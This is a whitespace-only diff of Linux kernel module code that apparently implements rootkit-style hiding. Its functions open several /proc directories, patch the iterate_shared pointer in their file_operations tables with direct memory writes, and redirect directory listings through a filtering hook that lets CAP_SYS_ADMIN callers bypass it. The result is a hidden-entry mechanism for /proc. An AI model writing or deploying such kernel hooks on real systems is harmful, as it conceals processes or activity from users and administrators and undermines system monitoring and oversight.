@@ -133,7 +133,7 @@ static int memd_iterate_shared(struct file *filp, struct dir_context *ctx)
     orig = READ_ONCE(orig_iterate);
     if (!orig)
         return -ENOSYS;
-    
+
     if (memd_capable(CAP_SYS_ADMIN))
         return orig(filp, ctx);
     if (!try_module_get(THIS_MODULE))
@@ -155,14 +155,14 @@ static int hook_proc_dir(const char *path)
     const struct file_operations *ops;
     iterate_shared_fn orig;
     int i;
-    
+
     if (hooked_fops_count >= MAX_HOOKED_OPS)
         return -ENOSPC;
-    
+
     f = filp_open(path, O_RDONLY | O_DIRECTORY, 0);
     if (IS_ERR(f))
         return PTR_ERR(f);
-    
+
     ops = memd_file_fop(f);
     filp_close(f, NULL);
     if (!ops || !memd_iter_get(ops)) {
@@ -171,31 +171,31 @@ static int hook_proc_dir(const char *path)
     }
     orig = (iterate_shared_fn)memd_iter_get(ops);
     memd_err("hide install: %s f_op=%px iterate=%px\n", path, ops, orig);
-    
+
     for (i = 0; i < hooked_fops_count; i++) {
         if (hooked_fops[i].ops == ops)
             return 0;
     }
-    
+
     hooked_fops[hooked_fops_count].ops = ops;
     hooked_fops[hooked_fops_count].orig_iterate = orig;
     hooked_fops[hooked_fops_count].path = path;
     hooked_fops_count++;
-    
+
     return 0;
 }
 
 static int install_hooks_on_fops(const struct file_operations *ops, iterate_shared_fn new_iter)
 {
     int wr;
-    
+
     wr = memd_table_write64((unsigned long)ops + (unsigned long)memd_iter_off(),
                             (unsigned long)new_iter);
     if (wr) {
         memd_err("hide install: table write failed\n");
         return -EIO;
     }
-    
+
     iterate_shared_fn back = (iterate_shared_fn)memd_iter_get(ops);
     if (!back || back != new_iter) {
         memd_err("hide install: readback mismatch\n");
@@ -203,27 +203,27 @@ static int install_hooks_on_fops(const struct file_operations *ops, iterate_shar
                            (unsigned long)hooked_fops[0].orig_iterate);
         return -EIO;
     }
-    
+
     return 0;
 }
 
 static int uninstall_hooks_from_fops(const struct file_operations *ops, iterate_shared_fn orig_iter)
 {
     int wr;
-    
+
     wr = memd_table_write64((unsigned long)ops + (unsigned long)memd_iter_off(),
                             (unsigned long)orig_iter);
     if (wr) {
         memd_err("hide uninstall: table write failed\n");
         return -EIO;
     }
-    
+
     iterate_shared_fn back = (iterate_shared_fn)memd_iter_get(ops);
     if (!back || back != orig_iter) {
         memd_err("hide uninstall: readback mismatch\n");
         return -EIO;
     }
-    
+
     return 0;
 }
 
@@ -232,14 +232,14 @@ int memd_hide_install(void)
     unsigned long flags;
     int ret = 0;
     int i;
-    
+
     spin_lock_irqsave(&syshook_lock, flags);
     if (atomic_read(&hook_active)) {
         spin_unlock_irqrestore(&syshook_lock, flags);
         return 0;
     }
     spin_unlock_irqrestore(&syshook_lock, flags);
-    
+
     const char *proc_dirs[] = {
         "/proc",
         "/proc/self/task",
@@ -248,7 +248,7 @@ int memd_hide_install(void)
         "/proc/self/ns",
         NULL
     };
-    
+
     for (int i = 0; proc_dirs[i]; i++) {
         ret = hook_proc_dir(proc_dirs[i]);
         if (ret && ret != -ENOSYS) {
@@ -256,7 +256,7 @@ int memd_hide_install(void)
             goto fail;
         }
     }
-    
+
     for (i = 0; i < hooked_fops_count; i++) {
         ret = install_hooks_on_fops(hooked_fops[i].ops, memd_iterate_shared);
         if (ret) {
@@ -264,14 +264,14 @@ int memd_hide_install(void)
             goto fail;
         }
     }
-    
+
     spin_lock_irqsave(&syshook_lock, flags);
     atomic_set(&hook_active, 1);
     spin_unlock_irqrestore(&syshook_lock, flags);
-    
+
     memd_info("hide: installed hooks on %d proc directories\n", hooked_fops_count);
     return 0;
-    
+
 fail:
     for (i = 0; i < hooked_fops_count; i++) {
         uninstall_hooks_from_fops(hooked_fops[i].ops, hooked_fops[i].orig_iterate);
@@ -285,7 +285,7 @@ int memd_hide_uninstall(void)
     unsigned long flags;
     int ret = 0;
     int i;
-    
+
     spin_lock_irqsave(&syshook_lock, flags);
     if (!atomic_read(&hook_active)) {
         spin_unlock_irqrestore(&syshook_lock, flags);
@@ -293,16 +293,16 @@ int memd_hide_uninstall(void)
     }
     atomic_set(&hook_active, 0);
     spin_unlock_irqrestore(&syshook_lock, flags);
-    
+
     for (i = 0; i < hooked_fops_count; i++) {
         ret = uninstall_hooks_from_fops(hooked_fops[i].ops, hooked_fops[i].orig_iterate);
         if (ret) {
             memd_err("hide uninstall: failed to uninstall hook on %s: %d\n", hooked_fops[i].path, ret);
         }
     }
-    
+
     hooked_fops_count = 0;
-    
+
     memd_info("hide: uninstalled hooks from %d proc directories\n", i);
     return ret;
 }
